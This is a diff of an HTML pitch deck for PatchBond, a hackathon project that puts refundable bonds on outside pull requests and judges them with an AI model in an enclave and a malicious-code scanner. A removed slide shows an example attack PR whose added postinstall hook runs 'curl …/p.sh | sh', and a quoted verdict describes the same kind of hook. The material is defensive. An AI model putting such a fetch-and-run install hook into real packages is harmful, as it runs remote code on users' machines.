@@ -73,40 +73,20 @@
   <div class="foot"><span>github.com/PatchBond/patchbond</span><span>NEAR Hackathon 2026</span></div>
 </section>
 
-<!-- 2. The problem, from a maintainer -->
-<section class="slide" style="justify-content:center">
+<!-- 2. The problem -->
+<section class="slide">
   <div class="eyebrow">The problem — from the maintainer of Sanctifier · 122 contributors · 571 PRs</div>
-  <p style="font-size:60px;line-height:1.28;letter-spacing:-.02em;font-weight:600;margin-top:40px;max-width:1600px">
+  <p style="font-size:46px;line-height:1.3;letter-spacing:-.02em;font-weight:600;margin-top:30px;max-width:1650px">
     “Some people just create <span class="g">tens of PRs</span> resolving issues they weren't even assigned to — or claim a PR does what it <span class="g">doesn't do.</span>”
   </p>
-  <p class="lead" style="margin-top:48px">Every one costs a maintainer time to read, check and close. The sender spends ten seconds. The maintainer spends an hour. <b style="color:var(--ink)">Nothing connects the two.</b></p>
-  <p style="font-size:30px;margin-top:40px;color:var(--ink)">AI is here to help open source — not to drown it.</p>
-  <div class="foot"><span>The PatchBond team</span><span>2</span></div>
-</section>
-
-<!-- 3. Why now -->
-<section class="slide">
-  <div class="eyebrow">Why now</div>
-  <h2>AI made sending free.<br><span class="m">Receiving still costs a human.</span></h2>
-  <div class="row" style="margin-top:80px">
-    <div class="card grow"><div class="stat g">~25%</div><p>of incoming pull requests are estimated to be low-quality AI output — <b style="color:var(--ink)">31%</b> on larger projects.</p><div class="src">Linux Foundation Research, Oct 2026</div></div>
-    <div class="card grow"><div class="stat">49</div><p>AI-slop security reports on curl's public list. curl moved low-severity reports public because AI reports nearly overwhelmed its team.</p><div class="src">curl maintainer's public list (gist)</div></div>
-    <div class="card grow"><div class="stat" style="font-size:96px">PRs off</div><p>GitHub added options to turn pull requests off or limit them to collaborators — shutting honest newcomers out too.</p><div class="src">GitHub, Aug 2026</div></div>
+  <p class="lead" style="margin-top:26px;font-size:30px">The sender spends ten seconds; the maintainer spends an hour. <b style="color:var(--ink)">Nothing connects the two</b> — and AI made sending free.</p>
+  <div class="row" style="margin-top:46px">
+    <div class="card grow" style="padding:32px"><div class="stat g" style="font-size:88px">~25%</div><p>of incoming PRs estimated to be low-quality AI output — 31% on larger projects.</p><div class="src">Linux Foundation Research, Oct 2026</div></div>
+    <div class="card grow" style="padding:32px"><div class="stat" style="font-size:88px">49</div><p>AI-slop security reports on curl's public list; curl moved low-severity reports public to cope.</p><div class="src">curl maintainer's public list</div></div>
+    <div class="card grow" style="padding:32px"><div class="stat" style="font-size:72px;line-height:1.22">PRs off</div><p>GitHub now lets repos turn PRs off or limit them to collaborators — shutting honest newcomers out too.</p><div class="src">GitHub, Aug 2026</div></div>
+    <div class="card grow" style="padding:32px;border-color:rgba(248,113,113,.4)"><div class="stat" style="font-size:60px;line-height:1.22;color:var(--danger)">Some are attacks</div><p>Rarely, an outside PR carries an install hook that runs a download or a poisoned workflow. PatchBond scans every added line for these.</p><div class="src">e.g. the xz-utils backdoor, 2024</div></div>
   </div>
-  <div class="foot"><span>Sources: docs/RESEARCH.md</span><span>3</span></div>
-</section>
-
-<!-- Threat -->
-<section class="slide" style="justify-content:center">
-  <div class="glow" style="top:120px;left:500px;background:rgba(248,113,113,.10)"></div>
-  <div class="eyebrow">The security problem</div>
-  <h1 style="margin-top:24px;max-width:1650px">Attacks don't break code. <span style="color:var(--danger)">They break tired maintainers.</span></h1>
-  <div class="row" style="margin-top:70px;align-items:stretch">
-    <div class="card grow"><h3 style="margin:0">The friendly pull request</h3><p>In 2024 a backdoor reached <b style="color:var(--ink)">xz-utils</b> — shipped in Linux distributions — after two years of “helpful” patches to an exhausted maintainer. Supply-chain attacks arrive as contributions.</p></div>
-    <div class="card grow mono" style="font-size:19px;line-height:1.8;background:#0a0c0e;white-space:nowrap;padding:36px 30px"><div class="f">✨ Fix typo in docs</div><div class="f">@friendly-dev · “happy to help!”</div><div class="m">- Teh queue runs jobs.</div><div class="m">+ The queue runs jobs.</div><div style="color:var(--danger)">+ "postinstall":<br>&nbsp;&nbsp;"curl …/p.sh | sh"</div></div>
-    <div class="card grow"><h3 style="margin:0">AI multiplies the volume</h3><p>When every PR costs an hour and there are hundreds, review gets rushed — exactly when a hidden payload slips through. PatchBond puts a price on the stranger's PR and a <b style="color:var(--ink)">deterministic malicious-code scan</b> in front of the model.</p></div>
-  </div>
-  <div class="foot"><span>Never run contributor code · read the repo's own CI · scan every added line</span><span>4</span></div>
+  <div class="foot"><span>Sources: docs/RESEARCH.md</span><span>2</span></div>
 </section>
 
 <!-- 4. The idea -->
@@ -119,8 +99,8 @@
     <div class="card grow"><span class="tag">2 · Verifiable AI</span><h3>A TEE model judges it after CI</h3><p>Using facts we compute. The response is signed and public.</p></div>
     <div class="card grow"><span class="tag">3 · Settle</span><h3>Refund — or the repo is paid</h3><p>Real work: every cent back. Slop: 90% to the repo's vault.</p></div>
   </div>
-  <p style="font-size:28px;color:var(--ink2);margin-top:50px">The opposite of tea.xyz: spam <b style="color:var(--ink)">costs</b> money instead of earning it. No token. Nobody is paid for submitting.</p>
-  <div class="foot"><span>PatchBond</span><span>5</span></div>
+  <p style="font-size:28px;color:var(--ink2);margin-top:50px">The bond sits in a NEAR contract — <b style="color:var(--ink)">never with us</b>; only the repo's linked payout account can withdraw. The opposite of tea.xyz: spam <b style="color:var(--ink)">costs</b> money instead of earning it. No token.</p>
+  <div class="foot"><span>PatchBond</span><span>3</span></div>
 </section>
 
 <!-- 5. Product -->
@@ -134,7 +114,7 @@
     </div>
     <img class="shot" src="../media/pay.png" style="width:1040px">
   </div>
-  <div class="foot"><span>Real app · NEAR testnet</span><span>6</span></div>
+  <div class="foot"><span>Real app · NEAR testnet</span><span>4</span></div>
 </section>
 
 <!-- 6. Attention pricing -->
@@ -150,7 +130,7 @@
       <div class="card" style="padding:30px"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Spam wave</span><p style="margin-top:14px">40 open → <b style="color:var(--ink)">$50 ceiling</b></p></div>
     </div>
   </div>
-  <div class="foot"><span class="mono">bond = clamp(min, max, base × 1.125^(open − capacity)) × reputation</span><span>7</span></div>
+  <div class="foot"><span class="mono">bond = clamp(min, max, base × 1.125^(open − capacity)) × reputation</span><span>5</span></div>
 </section>
 
 <!-- 7. The judge -->
@@ -171,13 +151,31 @@
     </div>
     <img class="shot" src="../media/verdict.png" style="width:900px;height:760px;object-fit:cover;object-position:top">
   </div>
-  <div class="foot"><span>Live: z-ai/glm-5.3-flash in a TEE · 0/15 good PRs forfeited · 14/15 refunded automatically · $0.00035 a verdict</span><span>8</span></div>
+  <div class="foot"><span>Live: z-ai/glm-5.3-flash in a TEE · 0/15 good PRs forfeited · 14/15 refunded automatically · $0.00035 a verdict</span><span>6</span></div>
+</section>
+
+<!-- 7. Trust -->
+<section class="slide">
+  <div class="eyebrow">Don't trust us</div>
+  <h2>Every verdict is checkable — <span class="g">and our server can leave the loop.</span></h2>
+  <div class="row" style="margin-top:46px;gap:22px">
+    <div class="card grow" style="padding:30px"><h3 class="mono" style="font-size:25px;margin:0">sha256(request) ✓</h3><p style="font-size:22px">The exact bytes the model saw.</p></div>
+    <div class="card grow" style="padding:30px"><h3 class="mono" style="font-size:25px;margin:0">sha256(response) ✓</h3><p style="font-size:22px">The exact answer, unedited.</p></div>
+    <div class="card grow" style="padding:30px"><h3 class="mono" style="font-size:25px;margin:0">signer ✓</h3><p style="font-size:22px">NEAR AI's attested enclave key — checked in your browser.</p></div>
+    <div class="card grow" style="padding:30px;border-color:rgba(34,197,94,.45)"><h3 class="mono g" style="font-size:25px;margin:0">contract ✓</h3><p style="font-size:22px">ecrecover on-chain: <b style="color:var(--ink)">no forfeit without it</b>, not even from our server.</p></div>
+  </div>
+  <div class="card" style="margin-top:30px;padding:34px 40px;border-color:rgba(34,197,94,.35)">
+    <span class="tag">OutLayer · Intel TDX · live on testnet</span>
+    <p style="font-size:26px;margin-top:16px;color:var(--ink2)">A server that builds the prompt could feed the model false facts. With <b style="color:var(--ink)">judge_in_tee</b>, anyone asks the contract; an enclave runs our pinned program — it reads GitHub itself, asks NEAR AI, applies the same rules (byte-identical prompts on 30 real PRs) — and the contract checks NEAR AI's signature before it settles. <span class="mono" style="font-size:22px">exclusive</span> mode removes the oracle's forfeit power entirely.</p>
+    <div class="mono" style="font-size:20px;color:var(--ink2);margin-top:16px"><span class="g">✓</span> tx GTZM613J… · 24.5 s in the enclave · 0.0036 NEAR · signer 0x3b75…fa0c recovered on-chain</div>
+  </div>
+  <div class="foot"><span>shared/src/verify.ts · contract/vault/src/tee.rs · contract/vault/src/outlayer.rs · docs/OUTLAYER.md</span><span>7</span></div>
 </section>
 
 <!-- Judge quality -->
 <section class="slide">
   <div class="eyebrow">Judge quality</div>
-  <h2>Built for precision: <span class="g">it never took an honest contributor's money.</span></h2>
+  <h2>Built for precision: <span class="g">0 of 35 genuine contributions forfeited.</span></h2>
   <div class="row" style="margin-top:56px;align-items:stretch">
     <div class="card" style="width:820px">
       <span class="tag">NEAR's own core repo · near/nearcore</span>
@@ -193,121 +191,38 @@
       <div class="card" style="border-color:rgba(248,113,113,.45)"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Forfeit · 0.99 · signed by NEAR AI</span><p style="font-style:italic;color:var(--ink)">“Adds a postinstall hook that pipes a remote script into a shell… none of the claimed work: no tests, no src/queue.ts change.”</p><p style="font-size:20px">The contract accepts this signature on-chain — <span class="mono" style="font-size:19px">bun run demo</span></p></div>
     </div>
   </div>
-  <div class="foot"><span>docs/eval · signed records verifiable offline: bun scripts/verify-record.ts</span><span>9</span></div>
-</section>
-
-<!-- 8. Verify it yourself -->
-<section class="slide" style="justify-content:center">
-  <div class="glow" style="top:200px;left:600px"></div>
-  <div class="eyebrow">Don't trust us — verify</div>
-  <h1 style="margin-top:24px;max-width:1600px">Every verdict is <span class="g">signed and checkable</span> — in your browser <span class="g">and by the contract.</span></h1>
-  <div class="row" style="margin-top:70px">
-    <div class="card grow"><h3 class="mono" style="font-size:28px;margin:0">sha256(request) ✓</h3><p>The exact bytes sent to the model in NEAR AI Cloud's TEE.</p></div>
-    <div class="card grow"><h3 class="mono" style="font-size:28px;margin:0">sha256(response) ✓</h3><p>The exact answer — nothing edited after the fact.</p></div>
-    <div class="card grow"><h3 class="mono" style="font-size:28px;margin:0">signer ✓</h3><p>The enclave's key, recovered from the signature (EIP-191).</p></div>
-    <div class="card grow" style="border-color:rgba(34,197,94,.45)"><h3 class="mono g" style="font-size:28px;margin:0">contract ✓</h3><p>The contract itself recovers NEAR AI's signature (ecrecover). <b style="color:var(--ink)">No forfeit without it</b> — not even from our own server.</p></div>
-  </div>
-  <div class="foot"><span>shared/src/verify.ts in the browser · contract/vault/src/tee.rs on-chain · keys from NEAR AI's attestation report</span><span>10</span></div>
-</section>
-
-<!-- OutLayer -->
-<section class="slide">
-  <div class="eyebrow">OutLayer · Intel TDX · live on testnet</div>
-  <h2>Our server leaves the loop.</h2>
-  <p class="lead">A server that builds the prompt could feed the model fake facts. So the contract can have the PR judged inside an <b style="color:var(--ink)">OutLayer enclave</b> instead — no PatchBond server in the path.</p>
-  <div class="row" style="margin-top:56px;align-items:stretch">
-    <div class="card grow"><span class="tag">1 · Anyone asks</span><h3>judge_in_tee(repo, pr)</h3><p>The contract writes the input itself — and pins the program's exact wasm hash.</p></div>
-    <div class="card grow"><span class="tag">2 · In the enclave</span><h3>Reads GitHub, asks NEAR AI</h3><p>Same facts, prompt and rules as the server — <b style="color:var(--ink)">byte-identical</b> on 30 real PRs (parity test).</p></div>
-    <div class="card grow" style="border-color:rgba(34,197,94,.45)"><span class="tag">3 · The contract checks</span><h3>ecrecover → NEAR AI's key</h3><p>Then settles. With <span class="mono" style="font-size:22px">exclusive</span> on, our oracle can't forfeit anything at all.</p></div>
-  </div>
-  <div class="card mono" style="margin-top:36px;padding:26px 34px;font-size:22px;line-height:1.7;color:var(--ink2);background:#0a0c0e">
-    <div><span class="g">✓</span> tx GTZM613J… · OutLayer ran our pinned wasm in <b style="color:var(--ink)">24.5 s</b> · 0.0036 NEAR</div>
-    <div><span class="g">✓</span> tee_verified · signer 0x3b75…fa0c (NEAR AI GLM enclave) · verdict hash computed on-chain</div>
-  </div>
-  <div class="foot"><span>outlayer/judge · contract/vault/src/outlayer.rs · docs/OUTLAYER.md</span><span>11</span></div>
+  <div class="foot"><span>docs/eval · signed records verifiable offline: bun scripts/verify-record.ts</span><span>8</span></div>
 </section>
 
 <!-- 9. Fair to both sides -->
 <section class="slide">
   <div class="eyebrow">Fair to both sides</div>
-  <h2>Nobody can game it — <span class="g">not even the maintainer.</span></h2>
+  <h2>Protects contributors, <span class="g">maintainers and the code.</span></h2>
   <div class="row" style="margin-top:60px;align-items:stretch">
     <div class="card grow"><span class="tag">Contributors protected</span><h3>A maintainer can't keep your bond on their own</h3><p>Their forfeit is a 48 h proposal you dispute <b style="color:var(--ink)">for free</b>. A stronger model re-judges. Overturned? You get your bond back <b style="color:var(--ink)">plus a penalty</b> from their vault — and it's on their public record.</p></div>
-    <div class="card grow"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Attacks caught</span><h3>Malicious code forfeits automatically</h3><p>A deterministic scan — not the model's mood — finds Trojan-Source Unicode, hidden payloads, install-time downloads and poisoned CI. Still challengeable. Zero false hits on 30 real PRs.</p></div>
+    <div class="card grow"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Attacks caught</span><h3>Malicious code is flagged before anyone reviews it</h3><p>A deterministic scan finds Trojan-Source Unicode, hidden payloads, install-time downloads and poisoned CI, and proposes a forfeit. It settles on-chain only if the model signed a forfeit too — otherwise a maintainer confirms. No false hits on 50 real PRs.</p></div>
     <div class="card grow"><span class="tag" style="color:var(--warn);background:rgba(251,191,36,.12)">Attention kept</span><h3>Unpaid PRs cost nothing to ignore</h3><p>Labelled <span class="mono" style="font-size:22px">deposit paid</span> / <span class="mono" style="font-size:22px">awaiting</span>, closed after an announced 24 h, reopened the moment they pay.</p></div>
   </div>
-  <div class="foot"><span>contract/vault/tests/maintainer_safeguards.rs · server/src/judge/malice.ts</span><span>12</span></div>
+  <div class="foot"><span>contract/vault/tests/maintainer_safeguards.rs · server/src/judge/malice.ts</span><span>9</span></div>
 </section>
 
 <!-- 10. The edges -->
 <section class="slide">
   <div class="eyebrow">Not a slop filter — a market</div>
-  <h2>Mechanisms nobody else has. One NEAR contract.</h2>
-  <div style="display:grid;grid-template-columns:1fr 1fr;gap:28px;margin-top:56px">
+  <h2>Four mechanisms, one NEAR contract.</h2>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:44px">
     <div class="card"><span class="tag">Priority lane</span><h3>Pay for attention, not for submitting</h3><p>A review tip reaches the repo only if a maintainer reviews within the promised window — otherwise it's refunded.</p></div>
     <div class="card"><span class="tag">Optimistic verdicts</span><h3>Cheap AI by default, strong AI when money's on the line</h3><p>Stake to challenge; a stronger model re-judges with both sides' statements; the loser's stake pays the winner.</p></div>
     <div class="card"><span class="tag">Slop funds the fix</span><h3>Spam pays whoever really fixes the issue</h3><p>A forfeited PR that claimed to fix #N becomes a bounty on #N, paid when a real fix is merged.</p></div>
-    <div class="card"><span class="tag">Agent passports</span><h3>Capped wallets for coding agents</h3><p>A function-call key that can only pay bonds, a daily cap enforced by the contract, a public record per harness.</p></div>
+    <div class="card"><span class="tag">Know your agent</span><h3>Capped wallets for coding agents</h3><p>A function-call key that can only pay bonds, under a daily cap the contract enforces; a public record per harness. On testnet, the bond over the cap was refused.</p></div>
   </div>
-  <div class="foot"><span>contract/vault/src</span><span>13</span></div>
-</section>
-
-<!-- 11. Money flow -->
-<section class="slide">
-  <div class="eyebrow">Where the money goes</div>
-  <h2>Held by a contract — <span class="g">never by us.</span></h2>
-  <svg viewBox="0 0 1660 520" style="width:1660px;margin-top:60px" font-family="Inter" font-size="26">
-    <defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0 0L10 5L0 10z" fill="#6b7079"/></marker></defs>
-    <rect x="0" y="190" width="320" height="140" rx="26" fill="#15181d" stroke="#2a2f37" stroke-width="2"/>
-    <text x="160" y="252" text-anchor="middle" fill="#eceae4" font-weight="700" font-size="30">Bond · USDC or NEAR</text>
-    <text x="160" y="292" text-anchor="middle" fill="#a3a6ad" font-size="22">held by the vault contract</text>
-    <path d="M320 260 H460" stroke="#6b7079" stroke-width="3" marker-end="url(#a)"/>
-    <rect x="470" y="190" width="320" height="140" rx="26" fill="#15181d" stroke="#22c55e" stroke-width="2"/>
-    <text x="630" y="252" text-anchor="middle" fill="#22c55e" font-weight="700" font-size="30">Verifiable verdict</text>
-    <text x="630" y="292" text-anchor="middle" fill="#a3a6ad">72 h to challenge</text>
-    <path d="M790 230 C 900 230 900 70 1010 70" stroke="#6b7079" stroke-width="3" fill="none" marker-end="url(#a)"/>
-    <path d="M790 260 H1010" stroke="#6b7079" stroke-width="3" marker-end="url(#a)"/>
-    <path d="M790 290 C 900 290 900 450 1010 450" stroke="#6b7079" stroke-width="3" fill="none" marker-end="url(#a)"/>
-    <rect x="1020" y="10" width="640" height="120" rx="24" fill="rgba(34,197,94,.12)" stroke="rgba(34,197,94,.4)" stroke-width="2"/>
-    <text x="1050" y="62" fill="#22c55e" font-weight="700" font-size="30">Refund — 100% back to the contributor</text>
-    <text x="1050" y="102" fill="#a3a6ad">+ on-chain reputation; proven people pay $0</text>
-    <rect x="1020" y="200" width="640" height="120" rx="24" fill="rgba(251,191,36,.10)" stroke="rgba(251,191,36,.4)" stroke-width="2"/>
-    <text x="1050" y="252" fill="#fbbf24" font-weight="700" font-size="30">Forfeit — 90% repo vault · 10% treasury</text>
-    <text x="1050" y="292" fill="#a3a6ad">or a bounty on the issue it claimed to fix</text>
-    <rect x="1020" y="390" width="640" height="120" rx="24" fill="#15181d" stroke="#2a2f37" stroke-width="2"/>
-    <text x="1050" y="442" fill="#eceae4" font-weight="700" font-size="30">Maintainer withdraws</text>
-    <text x="1050" y="482" fill="#a3a6ad">to NEAR · any chain via Intents · a DAO</text>
-  </svg>
-  <div class="foot"><span>Only the repo's linked payout account can withdraw — not the owner, not the oracle</span><span>14</span></div>
-</section>
-
-<!-- 12. Agents -->
-<section class="slide">
-  <div class="eyebrow">Agents are the senders now</div>
-  <div class="row" style="margin-top:30px;gap:70px;align-items:center">
-    <div style="width:660px">
-      <h2 style="font-size:60px">Know your agent.</h2>
-      <p class="lead" style="font-size:29px">Coding agents pay bonds through our <b style="color:var(--ink)">MCP server</b> — with a key that can do nothing else. It refuses to start with a full-access key.</p>
-      <p class="lead" style="font-size:29px">A <b style="color:var(--ink)">free pre-flight</b> tells the agent what the judge would flag <i>before</i> it pays.</p>
-    </div>
-    <div style="width:1000px">
-      <img class="shot" src="../media/agents-hero.png" style="width:1000px">
-      <div class="card mono" style="margin-top:30px;padding:30px 34px;font-size:21px;line-height:1.75;color:var(--ink2);background:#0a0c0e">
-        <div class="f">$ bun run e2e:testnet   # stage 9, real NEAR testnet</div>
-        <div><span class="g">✓</span> MCP patchbond_deposit paid $1.00 with the function-call key</div>
-        <div><span class="g">✓</span> third bond refused by the contract: “Daily cap reached…”</div>
-        <div><span class="g">✓</span> the key can't touch the token contract</div>
-        <div><span class="g">✓</span> the key can't call any other PatchBond method</div>
-      </div>
-    </div>
-  </div>
-  <div class="foot"><span>mcp/ · 7 tools · paid a real bond on testnet in our e2e</span><span>15</span></div>
+  <div class="foot"><span>contract/vault/src</span><span>10</span></div>
 </section>
 
 <!-- 13. NEAR -->
 <section class="slide">
   <div class="eyebrow">Built on NEAR</div>
-  <h2>Every piece is a NEAR primitive.</h2>
+  <h2>Built on NEAR primitives.</h2>
   <table style="margin-top:40px;font-size:26px">
     <tr><td>NEAR AI Cloud</td><td>Live verifiable inference in a TEE (GLM-5.3-flash, Kimi K3); signatures checked in the browser <b style="color:var(--ink)">and by the contract</b></td></tr>
     <tr><td>OutLayer (Intel TDX)</td><td>The judge as a wasm program in an enclave, called by the contract (yield/resume); the callback checks NEAR AI's signature</td></tr>
@@ -319,7 +234,7 @@
     <tr><td>NEAR Intents 1Click</td><td>Maintainers get paid on Base, Arbitrum, Ethereum or Solana</td></tr>
     <tr><td>Sputnik DAO / Trezu</td><td>Hand a repo's vault to a project treasury</td></tr>
   </table>
-  <div class="foot"><span>Paths to each in the README</span><span>16</span></div>
+  <div class="foot"><span>Paths to each in the README</span><span>11</span></div>
 </section>
 
 <!-- 14. Proof -->
@@ -337,7 +252,7 @@
     <span class="pill">✓ agent key can't escape its cap</span>
     <span class="pill">✓ NEAR bond: wrap + pay in one tx</span><span class="pill">✓ a maintainer can't keep a bond alone</span><span class="pill">✓ live PR on a 122-contributor repo, judged in a TEE</span><span class="pill">✓ a stolen oracle key can't redirect a vault — or fake a forfeit</span><span class="pill">✓ judged inside OutLayer TDX on testnet</span><span class="pill">✓ <span class="mono" style="font-size:18px">bun run demo</span>: clone → refund &amp; forfeit, one command</span>
   </div>
-  <div class="foot"><span>docs/e2e/testnet-report.md — one explorer link per tx · threat model in SECURITY.md</span><span>17</span></div>
+  <div class="foot"><span>docs/e2e/testnet-report.md — one explorer link per tx · threat model in SECURITY.md</span><span>12</span></div>
 </section>
 
 <!-- 15. Ask -->
@@ -347,7 +262,7 @@
   <h1 style="margin-top:44px;max-width:1500px">Make your repo's attention <span class="g">worth something.</span></h1>
   <div class="row" style="margin-top:64px">
     <div class="card grow"><h3 style="margin:0">Maintainers</h3><p>Try it on one repo in 10 minutes — <span class="mono" style="font-size:21px">docs/MAINTAINERS.md</span>. Your team never pays; we tune the judge on your real PRs.</p></div>
-    <div class="card grow"><h3 style="margin:0">Agent builders</h3><p>Plug in the MCP server. Give your agent a wallet that can't hurt you.</p></div>
+    <div class="card grow"><h3 style="margin:0">Agent builders</h3><p>Plug in the MCP server. Give your agent a wallet whose spending the contract caps.</p></div>
     <div class="card grow"><h3 style="margin:0">NEAR</h3><p>Verifiable AI deciding where real money goes — in public, for open source.</p></div>
   </div>
   <div class="foot"><span>github.com/PatchBond/patchbond</span><span>MIT · No token</span></div>
